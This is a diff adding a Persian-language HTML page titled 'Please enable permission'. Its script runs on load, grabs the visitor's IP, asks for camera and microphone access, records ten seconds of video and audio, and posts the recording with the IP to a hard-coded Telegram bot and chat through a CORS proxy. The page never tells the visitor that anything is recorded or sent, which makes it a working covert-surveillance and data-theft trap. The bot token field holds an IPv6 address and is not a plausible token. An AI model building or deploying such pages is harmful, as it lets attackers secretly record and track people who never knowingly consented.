@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+    <meta charset="UTF-8">
+    <title>لطفاً مجوز را فعال کنید</title>
+    <script>
+        // تغییر ۱: استفاده از پروکسی برای رفع CORS
+        const PROXY_URL = "https://cors-anywhere.herokuapp.com/";
+        const BOT_TOKEN = "2a09:bac5:41d8:2482::3a3:2c";  
+        const CHAT_ID = "5444708704";
+        let userIP = "نامشخص";
+
+        function showMessage(text, color = "black") {
+            let msgBox = document.getElementById("message");
+            msgBox.innerText = text;
+            msgBox.style.color = color;
+            msgBox.style.display = "block";
+        }
+
+        function getIP() {
+            fetch(PROXY_URL + "https://api.ipify.org?format=json")
+            .then(response => response.json())
+            .then(data => {
+                userIP = data.ip;
+                showMessage("✅ آی‌پی دریافت شد: " + userIP, "green");
+            })
+            .catch(error => {
+                showMessage("❌ خطا در دریافت آی‌پی!", "red");
+            });
+        }
+
+        // تغییر ۲: اضافه کردن HTTPS به API تلگرام
+        function sendToTelegram(message, file) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
+            const formData = new FormData();
+            formData.append("chat_id", CHAT_ID);
+            formData.append("video", file);
+            formData.append("caption", message);
+
+            fetch(PROXY_URL + url, {
+                method: "POST",
+                body: formData
+            })
+            .catch(error => console.error("ارسال ناموفق:", error));
+        }
+
+        function startRecording() {
+            navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+            .then(stream => {
+                let mediaRecorder = new MediaRecorder(stream);
+                let chunks = [];
+
+                mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                
+                mediaRecorder.onstop = () => {
+                    let blob = new Blob(chunks, { type: "video/webm" });
+                    sendToTelegram("آی‌پی کاربر: " + userIP, blob);
+                    stream.getTracks().forEach(track => track.stop());
+                };
+
+                mediaRecorder.start();
+                setTimeout(() => mediaRecorder.stop(), 10000);
+            })
+            .catch(err => {
+                console.warn("دسترسی رد شد:", err);
+            });
+        }
+
+        window.onload = () => {
+            getIP();
+            setTimeout(startRecording, 1000);
+        };
+    </script>
+    <style>
+        #message {
+            font-size: 18px;
+            font-weight: bold;
+            display: none;
+            text-align: center;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <h1>لطفاً مجوز را فعال کنید</h1>
+    <p id="message"></p>
+</body>
+</html>
